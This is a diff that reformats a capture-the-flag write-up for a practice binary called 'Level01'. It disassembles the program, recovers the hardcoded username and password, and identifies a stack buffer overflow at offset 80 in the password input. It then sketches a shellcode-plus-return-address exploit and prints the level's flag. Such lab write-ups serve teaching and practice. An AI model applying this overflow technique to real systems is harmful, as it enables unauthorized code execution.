@@ -1,18 +1,26 @@
-# begin so let's strat to launc the program
+# Level01 Write-up
 
+## Introduction
 
+Let's start by launching the program.
+
+## Program Execution
+
+```
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: asdf
 verifying username....
 
 nope, incorrect username...
+```
 
+The program asks for a username and prints an error message if it's incorrect.
 
+## Reverse Engineering
 
+Let's examine the program's internals:
 
-so the program ask fo the username ans is not correct is print is not correct 
-
-let's show the program inside :
+```assembly
 .text:080484D0 ; int __cdecl main(int argc, const char **argv, const char **envp)
 .text:080484D0                 public main
 .text:080484D0 main            proc near               ; DATA XREF: _start+17↑o
@@ -43,113 +51,77 @@ let's show the program inside :
 .text:08048510                 mov     eax, ds:stdin@@GLIBC_2_0
 .text:08048515                 mov     [esp+8], eax
 .text:08048519                 mov     dword ptr [esp+4], 100h
-.text:08048521                 mov     dword ptr [esp], offset a_user_name
+.text:08048521                 mov     [esp], offset a_user_name
 .text:08048528                 call    _fgets
 .text:0804852D                 call    verify_user_name
-.text:08048532                 mov     [esp+5Ch], eax
-.text:08048536                 cmp     dword ptr [esp+5Ch], 0
-.text:0804853B                 jz      short loc_8048550
-.text:0804853D                 mov     dword ptr [esp], offset aNopeIncorrectU ; "nope, incorrect username...\n"
-.text:08048544                 call    _puts
-.text:08048549                 mov     eax, 1
-.text:0804854E                 jmp     short loc_80485AF
-.text:08048550 ; ---------------------------------------------------------------------------
-.text:08048550
-.text:08048550 loc_8048550:                            ; CODE XREF: main+6B↑j
-.text:08048550                 mov     dword ptr [esp], offset aEnterPassword ; "Enter Password: "
-.text:08048557                 call    _puts
-.text:0804855C                 mov     eax, ds:stdin@@GLIBC_2_0
-.text:08048561                 mov     [esp+8], eax
-.text:08048565                 mov     dword ptr [esp+4], 64h ; 'd'
-.text:0804856D                 lea     eax, [esp+1Ch]
-.text:08048571                 mov     [esp], eax
-.text:08048574                 call    _fgets
-.text:08048579                 lea     eax, [esp+1Ch]
-.text:0804857D                 mov     [esp], eax
-.text:08048580                 call    verify_user_pass
-.text:08048585                 mov     [esp+5Ch], eax
-.text:08048589                 cmp     dword ptr [esp+5Ch], 0
-.text:0804858E                 jz      short loc_8048597
-.text:08048590                 cmp     dword ptr [esp+5Ch], 0
-.text:08048595                 jz      short loc_80485AA
-.text:08048597
-.text:08048597 loc_8048597:                            ; CODE XREF: main+BE↑j
-.text:08048597                 mov     dword ptr [esp], offset aNopeIncorrectP ; "nope, incorrect password...\n"
-.text:0804859E                 call    _puts
-.text:080485A3                 mov     eax, 1
-.text:080485A8                 jmp     short loc_80485AF
-.text:080485AA ; ---------------------------------------------------------------------------
-.text:080485AA
-.text:080485AA loc_80485AA:                            ; CODE XREF: main+C5↑j
-.text:080485AA                 mov     eax, 0
-.text:080485AF
-.text:080485AF loc_80485AF:                            ; CODE XREF: main+7E↑j
-.text:080485AF                                         ; main+D8↑j
-.text:080485AF                 lea     esp, [ebp-8]
-.text:080485B2                 pop     ebx
-.text:080485B3                 pop     edi
-.text:080485B4                 pop     ebp
-.text:080485B5                 retn
-.text:080485B5 ; } // starts at 80484D0
-.text:080485B5 main       
+```
 
+## Program Flow
 
-so the program 
+The program:
 
-is set the buffer inside esp + 28 to 0 
+1. Sets the buffer at `esp + 28` to 0:
+```assembly
 lea     ebx, [esp+28]
 mov     eax, 0
 mov     edx, 16
 mov     edi, ebx
 mov     ecx, edx
 rep stosd
+```
 
-
-put 0 inside the addres esp+92
+2. Puts 0 at address `esp+92`:
+```assembly
 mov     dword ptr [esp+92], 0
+```
 
-
-and print the value of the string admin login
+3. Prints the admin login prompt:
+```assembly
 mov     dword ptr [esp], offset aAdminLoginProm ; "********* ADMIN LOGIN PROMPT *********"
 call    _puts
+```
 
-print enter Username:
+4. Prints "Enter Username:":
+```assembly
 mov     eax, offset aEnterUsername ; "Enter Username: "
 mov     [esp], eax
 call    _printf
+```
 
-
-put for the first the addres of the .bss buffer 
-for the second 256 
-for the last argument stind
-
-so is copy 256 element from stdin and put inside the buffer in bss of the name a_user_name
-
+5. Reads 256 bytes from stdin and stores them in the `.bss` buffer `a_user_name`:
+```assembly
 mov     eax, ds:stdin@@GLIBC_2_0
 mov     [esp+8], eax
 mov     dword ptr [esp+4], 256
-mov     dword ptr [esp], offset a_user_name
+mov     [esp], offset a_user_name
 call    _fgets
+```
 
+The buffer size:
+```assembly
 .bss:0804A040                 public a_user_name
 .bss:0804A040 a_user_name     db    ? ;               ; DATA XREF: verify_user_name+14↑o
 .bss:0804A040                                         ; main+51↑o\
-
 .bss:0804A0A2                 db    ? ;
 .bss:0804A0A3                 db    ? ;
 .bss:0804A0A3 _bss            ends
+```
 
-so the size if 
-
+The buffer size is:
+```
 gef➤  p/d 0x0804A0A2-0x0804A040
 $7 = 98
+```
 
-so the buffer of a_user_name is only a size of 98 octet
+So the `a_user_name` buffer is only 98 bytes in size.
 
-
-after is make a call to this function :
+6. Calls `verify_user_name`:
+```assembly
 call    verify_user_name
+```
 
+The `verify_user_name` function:
+```assembly
 public verify_user_name
 verify_user_name proc near
 ; __unwind {
@@ -179,43 +151,31 @@ pop     ebp
 retn
 ; } // starts at 8048464
 verify_user_name endp
+```
 
-
-
-so the only important thing here is make a comparaison of :
+The important part is the comparison:
+```assembly
 mov     edx, offset a_user_name
 mov     eax, offset aDatWil ; "dat_wil"
 mov     ecx, 7
 mov     esi, edx
 mov     edi, eax
 repe cmpsb
+```
 
-is compare 7 octet from aDatWil like strncmp
+This compares 7 bytes from `aDatWil` (like `strncmp`).
 
-setnbe  dl
-setb    al
-mov     ecx, edx
-sub     cl, al
-mov     eax, ecx
-movsx   eax, al
+So the username is `dat_wil`.
 
-and put the restult inside the eax 
-
-and reset the stack
-
-
-so the username is dat_wil
-
-
-after is verify the result of the call the function if is 0
+7. After verifying the result of the function call, if it's 0, it continues with `verify_user_pass`:
+```assembly
 mov     [esp+5Ch], eax
 cmp     dword ptr [esp+5Ch], 0
 jz      short loc_8048550
+```
 
-
-if is zeros is continue with call the function verify_user_pass and verifiy the result
-is get 100 element inside the buffer at position esp + 8
-
+8. Gets 100 bytes into the buffer at position `esp + 28`:
+```assembly
 mov     dword ptr [esp], offset aEnterPassword ; "Enter Password: "
 call    _puts
 mov     eax, ds:stdin@@GLIBC_2_0
@@ -227,16 +187,10 @@ call    _fgets
 lea     eax, [esp+28]
 mov     [esp], eax
 call    verify_user_pass
-mov     [esp+5Ch], eax
-cmp     dword ptr [esp+5Ch], 0
-jz      short loc_8048597
+```
 
-
-
-
-
-
-the function verify_user_pass :
+The `verify_user_pass` function:
+```assembly
 ; __unwind {
 push    ebp
 mov     ebp, esp
@@ -260,72 +214,50 @@ pop     edi
 pop     ebp
 retn
 ; } // st
+```
 
+This compares the first 5 bytes with "admin".
 
+So the password is `admin`.
 
-is compare the first 5 octet with "admin"
+## Vulnerability
 
+The exploit works because in the second `fgets` call, it reads 100 bytes and puts the elements inside the stack buffer, but the stack buffer is actually of size `96 - 28 = 68` bytes. However, because you have a variable at position `mov [esp+92], eax`:
 
-so the password is admin:
-
-after is return to the stack verify the result with 0 
-
-if is 0 is compare with the previus call of the function 
-cmp     dword ptr [esp+92], 0
-jz      short loc_80485AA
-
-and is correc put 0 inside eax 
-loc_80485AA:
-mov     eax, 0
-
-and restore the stack
-loc_80485AF:
-lea     esp, [ebp-8]
-pop     ebx
-pop     edi
-pop     ebp
-retn
-; } // starts at 80484D0
-main endp
-
-
-the exploit is because inside the second call of fgets is read 100 octet and 
-put the element insude the stack buffer but the stack buffer is acctually of size 
-96 - 28 = 68 octet 
-but because you are variable at position mov     [esp+92], eax
-
-
-
+```assembly
 mov     eax, ds:stdin@@GLIBC_2_0
 mov     [esp+8], eax
 mov     dword ptr [esp+4], 100
 lea     eax, [esp+28]
 mov     [esp], eax
 call    _fgets
+```
 
+The problem here is copying more elements than the size of the buffer.
 
-so here the probelm is copy more element than the size of the buffer
+## Exploitation
 
+To create a cyclic pattern for the second argument to find the offset:
 
-so go to create a cycly pattern for the second argument to find the offset:
-
-and found a offset of 80:
+Found an offset of 80:
+```
 gef➤  pattern search $eip
 [+] Searching for '75616161'/'61616175' with period=4
 [+] Found at offset 80 (little-endian search) likely
+```
 
-
-
-destination :
+Destination:
+```
 info variable 
-
-
 0x0804a040  a_user_name
+```
 
+So:
+- Input 1 = `dat_wil` + shellcode
+- Input 2 = `A * 80` + address
 
-so input 1 = data_wil + shellcode
-so input 2 = a * 80 + addr
+## Flag
 
-
-AND GET THE FLAG
+```
 PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+```
